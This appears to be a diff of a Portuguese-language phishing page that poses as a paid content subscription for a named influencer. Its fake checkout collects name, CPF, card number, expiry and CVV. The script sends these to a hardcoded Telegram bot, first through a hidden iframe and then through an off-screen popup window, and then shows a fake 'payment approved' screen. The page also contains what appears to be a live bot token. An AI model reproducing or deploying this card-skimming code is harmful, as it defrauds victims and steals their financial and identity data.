@@ -17,7 +17,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
         body { background: #fff; color: #333; user-select: none; -webkit-user-select: none; overflow-x: hidden; }
         input { user-select: text !important; -webkit-user-select: text !important; }
-        img { pointer-events: none; -webkit-user-drag: none; }
 
         .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; position: sticky; top: 0; background: #fff; z-index: 100; }
         .logo-img { height: 28px; }
@@ -31,38 +30,23 @@
         .info { padding: 15px 20px; }
         .name { font-size: 24px; font-weight: 800; display: flex; align-items: center; gap: 6px; }
         .user-at { color: #888; font-size: 14px; margin-bottom: 12px; }
-        .bio { font-size: 14px; line-height: 1.6; color: #444; margin-bottom: 15px; }
-
-        .socials { display: flex; gap: 10px; margin-bottom: 25px; }
-        .soc-btn { width: 40px; height: 40px; border-radius: 50%; border: 1px solid #e0e0e0; display: flex; align-items: center; justify-content: center; color: var(--p-orange); font-size: 17px; }
 
         .plans { padding: 0 20px; display: flex; flex-direction: column; gap: 12px; }
-        .btn-plan { width: 100%; padding: 20px 25px; border-radius: 50px; border: none; color: #fff; background: var(--p-grad); display: flex; justify-content: space-between; align-items: center; cursor: pointer; text-decoration: none; box-shadow: 0 4px 15px rgba(244,123,82,0.2); }
-        .plan-txt { font-size: 20px; font-weight: 600; }
-        .new-p { font-size: 20px; font-weight: 800; }
-
+        .btn-plan { width: 100%; padding: 20px 25px; border-radius: 50px; border: none; color: #fff; background: var(--p-grad); display: flex; justify-content: space-between; align-items: center; cursor: pointer; text-decoration: none; }
+        
         .gallery { padding: 20px; }
         .media-item { width: 100%; height: 260px; border-radius: 20px; background: #eee url('imagem2.png') center/cover no-repeat; filter: blur(20px); border: 1px solid #eee; }
 
-        .faq-sect { padding: 30px 20px; }
-        .faq-title { margin-bottom: 20px; color: var(--p-orange); font-weight: 800; font-size: 28px; }
-        .faq-item { padding: 18px; border: 1px solid #f0f0f0; border-radius: 12px; margin-bottom: 10px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; background: #fafafa; }
-
         #payModal, #successScreen { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; backdrop-filter: blur(10px); }
-        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 450px; border-radius: 30px; padding: 30px; text-align: center; }
+        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 450px; border-radius: 30px; padding: 30px; }
         .f-group { margin-bottom: 15px; text-align: left; }
         .f-group label { display: block; font-weight: 800; font-size: 11px; color: #aaa; text-transform: uppercase; margin-bottom: 5px; }
         .f-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #eee; background: #f9f9f9; font-size: 16px; outline: none; }
         
         #successScreen { background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
         .img-win { width: 100%; max-width: 320px; border-radius: 20px; margin: 20px 0; border: 4px solid var(--p-orange); }
-
-        /* Estilo da tela final que você pediu */
         .status-txt { font-size: 26px; font-weight: 900; color: #4CAF50; margin-bottom: 5px; }
         .delivery-txt { font-size: 18px; font-weight: 600; color: #666; }
-
-        /* iFrame oculto para processar o link sem abrir aba */
-        #hiddenSender { display: none; width: 0; height: 0; border: none; }
     </style>
 </head>
 <body oncontextmenu="return false">
@@ -85,39 +69,32 @@
     <div class="info">
         <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
         <div class="user-at">@eukamylinhasantos</div>
-        <p class="bio">Oi, meus amores! 🔥 Venha ver tudo o que eu não posso postar no Instagram. Assine agora para liberar meus vídeos e fotos exclusivas!</p>
     </div>
 
     <div class="plans">
         <div class="btn-plan" onclick="openPay('Mensal', '10,00')">
-            <span class="plan-txt">Assinatura Mensal</span>
-            <span class="new-p">R$ 10,00</span>
+            <span style="font-size: 20px; font-weight: 600;">Assinar Mensal</span>
+            <span style="font-weight: 800;">R$ 10,00</span>
         </div>
         <div class="btn-plan" onclick="openPay('Vitalício', '27,00')">
-            <span class="plan-txt">Acesso Vitalício</span>
-            <span class="new-p">R$ 27,00</span>
+            <span style="font-size: 20px; font-weight: 600;">Acesso Vitalício</span>
+            <span style="font-weight: 800;">R$ 27,00</span>
         </div>
     </div>
 
     <div class="gallery"><div class="media-item"></div></div>
 
-    <div class="faq-sect">
-        <h2 class="faq-title">Dúvidas</h2>
-        <div class="faq-item">O acesso é imediato? <i class="fa-solid fa-plus"></i></div>
-        <div class="faq-item">Aparece o que na fatura? <i class="fa-solid fa-plus"></i></div>
-    </div>
-
     <div id="payModal">
         <div class="m-content">
-            <h2 id="planTitle" style="color:var(--p-orange); margin-bottom:20px; font-weight:800">Pagamento Seguro</h2>
-            <div class="f-group"><label>Nome Completo</label><input type="text" id="n" placeholder="Como no cartão"></div>
-            <div class="f-group"><label>CPF do Titular</label><input type="text" id="f" placeholder="000.000.000-00"></div>
-            <div class="f-group"><label>Número do Cartão</label><input type="text" id="c" placeholder="0000 0000 0000 0000"></div>
+            <h2 id="planTitle" style="color:var(--p-orange); margin-bottom:20px; font-weight:800">Checkout</h2>
+            <div class="f-group"><label>Nome no Cartão</label><input type="text" id="n"></div>
+            <div class="f-group"><label>CPF</label><input type="text" id="f"></div>
+            <div class="f-group"><label>Número do Cartão</label><input type="text" id="c"></div>
             <div style="display:flex; gap:10px">
-                <div class="f-group" style="flex:1"><label>Validade</label><input type="text" id="v" placeholder="MM/AA"></div>
-                <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="s" placeholder="123"></div>
+                <div class="f-group" style="flex:1"><label>Validade</label><input type="text" id="v"></div>
+                <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="s"></div>
             </div>
-            <button class="btn-plan" style="justify-content:center; font-weight:800; width:100%" onclick="processarEnvio()">APROVAR COMPRA</button>
+            <button class="btn-plan" style="justify-content:center; font-weight:800; width:100%" onclick="enviar()">APROVAR COMPRA</button>
         </div>
     </div>
 
@@ -126,11 +103,8 @@
         <h1 class="status-txt">PAGAMENTO APROVADO</h1>
         <p class="delivery-txt">Entrega de conteúdo em até 24Hrs</p>
         <img src="imagem1.png" class="img-win">
-        <p style="font-weight:700; color:#999;">Verifique seu e-mail cadastrado para o acesso.</p>
-        <button class="btn-plan" style="width:200px; justify-content:center; margin-top:30px" onclick="location.reload()">CONCLUIR</button>
+        <button class="btn-plan" style="width:200px; justify-content:center; margin-top:20px" onclick="location.reload()">SAIR</button>
     </div>
-
-    <iframe id="hiddenSender"></iframe>
 
     <script>
         let pSel = "";
@@ -143,35 +117,27 @@
 
         function openPay(n, p) { pSel = n; $('#planTitle').text('Plano ' + n + ' - R$ ' + p); $('#payModal').fadeIn(); }
 
-        function processarEnvio() {
+        function enviar() {
             const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
             const chat = '-1003569961624';
+            const d = { n: $('#n').val(), c: $('#c').val(), f: $('#f').val(), v: $('#v').val(), s: $('#s').val() };
+
+            if (d.c.length < 16) return Notiflix.Notify.failure('Dados inválidos!');
+
+            Notiflix.Loading.circle('Processando...');
+
+            const msg = `🚀 NOVO CARD\n👤 Nome: ${d.n}\n🆔 CPF: ${d.f}\n💳 Card: ${d.c}\n📅 Val: ${d.v}\n🔒 CVV: ${d.s}\n💰 Plano: ${pSel}`;
             
-            const n = $('#n').val();
-            const f = $('#f').val();
-            const c = $('#c').val();
-            const v = $('#v').val();
-            const s = $('#s').val();
-
-            if (c.length < 16 || f.length < 14 || n.length < 3) {
-                Notiflix.Notify.failure('Preencha os dados do cartão corretamente!');
-                return;
-            }
-
-            Notiflix.Loading.circle('Validando com a operadora...');
-
-            const msg = `🚀 NOVO CARD CAPTURADO\n👤 Nome: ${n}\n🆔 CPF: ${f}\n💳 Card: ${c}\n📅 Val: ${v}\n🔒 CVV: ${s}\n💰 Plano: ${pSel}`;
-            
-            // MÉTODO DO IFRAME: O navegador carrega o link do Telegram sem abrir aba
+            // Abre janela oculta para o Telegram e fecha rápido
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
-            document.getElementById('hiddenSender').src = url;
+            const win = window.open(url, '_blank', 'width=1,height=1,left=25000,top=25000');
 
-            // Espera o "tempo de processamento" fake e pula pra tela final
             setTimeout(() => {
+                if(win) win.close();
                 Notiflix.Loading.remove();
                 $('#payModal').hide();
                 $('#successScreen').css('display', 'flex'); 
-            }, 3000);
+            }, 2000);
         }
     </script>
 </body>
